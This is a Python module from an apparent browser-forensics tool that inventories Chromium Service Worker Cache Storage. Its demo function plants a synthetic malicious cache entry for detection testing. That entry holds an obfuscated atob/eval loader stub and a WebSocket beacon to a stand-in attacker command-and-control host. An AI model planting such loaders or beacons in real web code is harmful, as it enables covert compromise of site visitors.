"""Build / load a Service Worker Cache Storage inventory.

Two sources:
  * load_json(path)     — load an extracted inventory (reproducible, offline).
  * from_profile(dir)   — best-effort walk of a live Chromium profile's
                          `Service Worker/CacheStorage/` tree (structure + index
                          presence + mtimes). Full response-body extraction is
                          delegated to ccl_chromium_reader (not reinvented here);
                          FLOTSAM's value is the hunting lens over the inventory.
  * make_sim(path)      — write a synthetic inventory with a planted payload so
                          the whole pipeline can be demoed with no browser.
"""
from __future__ import annotations

import json
import os
import time

from .models import (
    Inventory, OriginStore, CacheBucket, CacheEntry,
)


def _entry(d: dict) -> CacheEntry:
    return CacheEntry(**{k: d.get(k, getattr(CacheEntry(), k)) for k in
                         CacheEntry().__dict__})


def load_json(path: str) -> Inventory:
    with open(path, "r", encoding="utf-8") as fh:
        raw = json.load(fh)
    origins = []
    for o in raw.get("origins", []):
        caches = []
        for c in o.get("caches", []):
            entries = [_entry(e) for e in c.get("entries", [])]
            caches.append(CacheBucket(
                name=c.get("name", ""), guid=c.get("guid", ""),
                in_index=c.get("in_index", True), mtime=c.get("mtime", 0.0),
                entries=entries))
        origins.append(OriginStore(
            origin=o.get("origin", ""), origin_hash=o.get("origin_hash", ""),
            caches=caches))
    return Inventory(profile=raw.get("profile", ""),
                     extracted_at=raw.get("extracted_at", 0.0), origins=origins)


def from_profile(profile_dir: str) -> Inventory:
    """Structural inventory of a real Chromium profile (no body parsing)."""
    base = os.path.join(profile_dir, "Service Worker", "CacheStorage")
    inv = Inventory(profile=profile_dir, extracted_at=time.time())
    if not os.path.isdir(base):
        return inv
    for origin_hash in sorted(os.listdir(base)):
        odir = os.path.join(base, origin_hash)
        if not os.path.isdir(odir):
            continue
        indexed: set[str] = set()
        idx_txt = os.path.join(odir, "index.txt")
        if os.path.exists(idx_txt):
            try:
                indexed = set(open(idx_txt, encoding="utf-8", errors="ignore")
                              .read().split())
            except Exception:  # noqa: BLE001
                pass
        store = OriginStore(origin=f"(hash:{origin_hash})", origin_hash=origin_hash)
        for guid in sorted(os.listdir(odir)):
            cdir = os.path.join(odir, guid)
            if not os.path.isdir(cdir):
                continue
            store.caches.append(CacheBucket(
                name=guid, guid=guid,
                in_index=(guid in indexed) if indexed else True,
                mtime=os.path.getmtime(cdir)))
        inv.origins.append(store)
    return inv


def make_sim(path: str) -> str:
    """Write a synthetic inventory: one benign origin + one compromised one."""
    now = time.time()
    data = {
        "profile": "SIMULATED",
        "extracted_at": now,
        "origins": [
            {
                "origin": "https://shop.example",
                "origin_hash": "aaaa1111",
                "caches": [
                    {"name": "static-v3", "guid": "g-1", "in_index": True, "mtime": now - 86400,
                     "entries": [
                         {"request_url": "https://shop.example/app.js",
                          "response_mime": "application/javascript", "response_status": 200,
                          "size": 20480, "body_sha256": "d1", "body_entropy": 4.6,
                          "body_preview": "export const version='3';",
                          "mtime": now - 86400},
                         {"request_url": "https://shop.example/logo.png",
                          "response_mime": "image/png", "response_status": 200,
                          "size": 8192, "body_sha256": "d2", "body_entropy": 7.9,
                          "body_preview": "", "mtime": now - 86400},
                     ]},
                    {"name": "evil-drop", "guid": "g-xx", "in_index": False, "mtime": now - 120,
                     "entries": [
                         {"request_url": "https://evil.attacker.tld/p.js",
                          "response_mime": "application/javascript", "response_status": 200,
                          "size": 4096, "body_sha256": "d3", "body_entropy": 5.8,
                          "body_preview": "var x=atob('ZXZpbCBwYXlsb2FkIGhlcmUg...');eval(x);"
                                          "new WebSocket('wss://evil.attacker.tld/c2');",
                          "mtime": now - 120},
                     ]},
                ],
            }
        ],
    }
    with open(path, "w", encoding="utf-8") as fh:
        json.dump(data, fh, indent=2)
    return path
